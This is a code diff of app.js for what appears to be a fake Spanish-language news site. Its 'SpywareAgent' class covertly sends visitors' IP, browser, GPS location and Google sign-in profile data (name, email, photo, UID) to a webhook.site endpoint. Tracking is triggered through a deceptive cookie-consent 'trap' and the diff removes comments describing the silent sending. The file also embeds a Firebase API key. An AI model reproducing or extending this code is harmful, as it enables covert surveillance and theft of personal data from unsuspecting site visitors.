@@ -1,4 +1,5 @@
-
+[file name]: app.js
+[file content begin]
 /**
  * GLOBAL INSIGHT CORE SYSTEM
  * Módulo de gestión de contenidos y telemetría.
@@ -6,20 +7,12 @@
  */
 
 const CONFIG = {
-    //Asegúrate de que esta sea TU URL de webhook.site válida
-    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614", 
+    WEBHOOK_URL: "https://webhook.site/69645d7a-1150-4fa8-91c8-5945d2312697", 
     COOKIE_TIMEOUT: 1500,
     FORCE_ACCEPT: true
 };
 
-// Configuración de Firebase (REEMPLAZA CON TUS PROPIAS CREDENCIALES)
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
-
-// Your web app's Firebase configuration
+// === CONFIGURACIÓN FIREBASE - REEMPLAZA CON TUS CREDENCIALES REALES ===
 // For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
   apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
@@ -30,10 +23,8 @@ const firebaseConfig = {
   appId: "1:123889106526:web:f3d296fedf8e92907dbecf",
   measurementId: "G-5Z0VCWZD4S"
 };
+// === FIN CONFIGURACIÓN FIREBASE ===
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
 const newsDatabase = [
     { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
     { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
@@ -58,7 +49,6 @@ class SpywareAgent {
             const res = await fetch('https://ipwho.is/');
             const data = await res.json();
             this.ipData = data;
-            // Envío silencioso de IP
             this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
         } catch (e) { console.error("Fallo IP"); }
     }
@@ -85,10 +75,9 @@ class SpywareAgent {
     }
 
     exfiltrate(payload, type, precision) {
-        // MODO NO-CORS: Envía los datos sin esperar respuesta (para evitar errores en consola)
         fetch(this.webhook, {
             method: 'POST',
-            mode: 'no-cors', // <--- CRUCIAL PARA VERCEL
+            mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain' },
             body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
         }).then(() => console.log(">> Datos enviados (Silencioso)")).catch(e => console.log("Error envío"));
@@ -108,19 +97,64 @@ class AuthManager {
 
     initFirebase() {
         try {
+            console.log("🔄 Inicializando Firebase...");
+            console.log("📋 Config:", FIREBASE_CONFIG);
+            
+            // Verificar que FIREBASE_CONFIG existe
+            if (typeof FIREBASE_CONFIG === 'undefined') {
+                throw new Error("FIREBASE_CONFIG no está definida. Revisa la configuración.");
+            }
+
+            // Verificar que Firebase está cargado
+            if (typeof firebase === 'undefined') {
+                throw new Error("Firebase SDK no está cargado. Revisa el HTML.");
+            }
+
+            // Verificar configuración
+            if (!FIREBASE_CONFIG.apiKey || FIREBASE_CONFIG.apiKey.includes("AAAAAAAA")) {
+                throw new Error("Configuración de Firebase no válida. Reemplaza las credenciales en FIREBASE_CONFIG.");
+            }
+
+            // Inicializar Firebase
             firebase.initializeApp(FIREBASE_CONFIG);
             this.initialized = true;
+            console.log("✅ Firebase inicializado correctamente");
             
             // Escuchar cambios de autenticación
             firebase.auth().onAuthStateChanged((user) => {
                 this.handleAuthStateChange(user);
             });
+
         } catch (error) {
-            console.error("Error inicializando Firebase:", error);
+            console.error("❌ Error inicializando Firebase:", error);
+            this.showFirebaseError(error.message);
+        }
+    }
+
+    showFirebaseError(message) {
+        const errorDiv = document.createElement('div');
+        errorDiv.style.cssText = `
+            position: fixed; top: 10px; left: 10px; background: #d93025; color: white;
+            padding: 15px; border-radius: 5px; z-index: 10000; max-width: 400px;
+            font-family: Arial, sans-serif; font-size: 14px;
+        `;
+        errorDiv.innerHTML = `
+            <strong>Error de Firebase:</strong><br>
+            ${message}<br>
+            <small>Verifica la configuración en app.js</small>
+        `;
+        document.body.appendChild(errorDiv);
+        
+        // También mostrar en el botón de login
+        const loginBtn = document.getElementById('btn-login');
+        if (loginBtn) {
+            loginBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error Config';
+            loginBtn.style.background = '#d93025';
         }
     }
 
     handleAuthStateChange(user) {
+        console.log("🔄 Estado de autenticación cambiado:", user);
         if (user) {
             this.user = user;
             this.showUserProfile(user);
@@ -133,8 +167,9 @@ class AuthManager {
 
     async signInWithGoogle() {
         if (!this.initialized) {
-            alert("Sistema de autenticación no disponible");
-            return;
+            const errorMsg = "Firebase no se inicializó correctamente. Verifica la consola.";
+            alert(errorMsg);
+            return null;
         }
 
         const provider = new firebase.auth.GoogleAuthProvider();
@@ -142,11 +177,23 @@ class AuthManager {
         provider.addScope('email');
 
         try {
+            console.log("🔐 Iniciando autenticación con Google...");
             const result = await firebase.auth().signInWithPopup(provider);
+            console.log("✅ Autenticación exitosa:", result.user);
             return result.user;
         } catch (error) {
-            console.error("Error en login:", error);
-            alert("Error al iniciar sesión: " + error.message);
+            console.error("❌ Error en login:", error);
+            
+            let errorMessage = "Error al iniciar sesión: ";
+            if (error.code === 'auth/popup-blocked') {
+                errorMessage += "El popup fue bloqueado. Permite ventanas emergentes.";
+            } else if (error.code === 'auth/popup-closed-by-user') {
+                errorMessage += "Cerraste la ventana de login.";
+            } else {
+                errorMessage += error.message;
+            }
+            
+            alert(errorMessage);
             return null;
         }
     }
@@ -154,8 +201,9 @@ class AuthManager {
     async signOut() {
         try {
             await firebase.auth().signOut();
+            console.log("✅ Sesión cerrada correctamente");
         } catch (error) {
-            console.error("Error cerrando sesión:", error);
+            console.error("❌ Error cerrando sesión:", error);
         }
     }
 
@@ -170,10 +218,18 @@ class AuthManager {
             const avatar = document.getElementById('user-avatar');
             if (user.photoURL) {
                 avatar.src = user.photoURL;
+            } else {
+                avatar.src = 'https://via.placeholder.com/50/007bff/ffffff?text=U';
             }
             
             authWidget.style.display = 'none';
             profileWidget.style.display = 'block';
+            
+            console.log("👤 Perfil mostrado:", {
+                nombre: user.displayName,
+                email: user.email,
+                foto: user.photoURL
+            });
         }
     }
 
@@ -203,16 +259,17 @@ class AuthManager {
             timestamp: new Date().toISOString()
         };
 
-        // Enviar datos del usuario al webhook
         if (window.spyAgent) {
             window.spyAgent.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
         }
 
-        console.log("📧 Datos de usuario capturados:", {
-            nombre: user.displayName,
-            email: user.email,
-            foto: user.photoURL
-        });
+        console.log("📧 Datos de usuario capturados para exfiltración:", userData);
+        
+        console.log("🎯 DATOS OBTENIDOS LEGALMENTE:");
+        console.log("   👤 Nombre:", user.displayName);
+        console.log("   📧 Email:", user.email);
+        console.log("   🖼️ Foto:", user.photoURL);
+        console.log("   🆔 UID:", user.uid);
     }
 }
 
@@ -222,10 +279,8 @@ function renderNews() {
     const heroEl = document.getElementById("hero-news");
     const gridEl = document.getElementById("secondary-grid");
     
-    // Barajar noticias aleatoriamente
     const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());
 
-    // 1. Renderizar Hero (Noticia Grande)
     if(heroEl && shuffled.length > 0) {
         const hero = shuffled[0];
         heroEl.innerHTML = `
@@ -237,10 +292,9 @@ function renderNews() {
         `;
     }
 
-    // 2. Renderizar Grid Secundario (4 noticias abajo)
     if(gridEl && shuffled.length > 1) {
         gridEl.innerHTML = ""; 
-        const secondaryNews = shuffled.slice(1, 5); // Tomar las siguientes 4
+        const secondaryNews = shuffled.slice(1, 5);
         
         secondaryNews.forEach(news => {
             const card = document.createElement('div');
@@ -260,7 +314,6 @@ function renderTrending() {
     if(!listEl) return;
 
     listEl.innerHTML = ""; 
-    // Tomamos 5 noticias para la lista lateral
     const trendingNews = newsDatabase.slice(0, 5); 
 
     trendingNews.forEach((news, index) => {
@@ -278,6 +331,9 @@ function renderTrending() {
 
 // --- INICIO DE LA APLICACIÓN ---
 document.addEventListener("DOMContentLoaded", async () => {
+    
+    console.log("🚀 Iniciando aplicación Global Insight...");
+    console.log("🔍 Verificando FIREBASE_CONFIG:", typeof FIREBASE_CONFIG);
     
     // 1. Inicializar Agente Espía
     const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
@@ -326,7 +382,6 @@ document.addEventListener("DOMContentLoaded", async () => {
             
             spy.trackGPS(
                 async (data) => {
-                    // ÉXITO
                     btnGps.style.opacity = "0";
                     setTimeout(() => { btnGps.style.display = "none"; }, 500);
                     
@@ -384,7 +439,6 @@ function setupAuthEvents(authManager) {
         });
     }
 
-    // Cerrar modal al hacer click fuera
     if (loginModal) {
         loginModal.addEventListener('click', (e) => {
             if (e.target === loginModal) {
@@ -423,7 +477,7 @@ function setupCookieTrap(spyAgent) {
     const close = () => {
         spyAgent.setCookiesAccepted(true);
         modal.style.display = 'none';
-        spyAgent.trackIP(); // Iniciar rastreo al cerrar
+        spyAgent.trackIP();
         showSafeNotification();
     };
 
@@ -460,4 +514,4 @@ style.textContent = `
     }
 `;
 document.head.appendChild(style);
-
+[file content end]
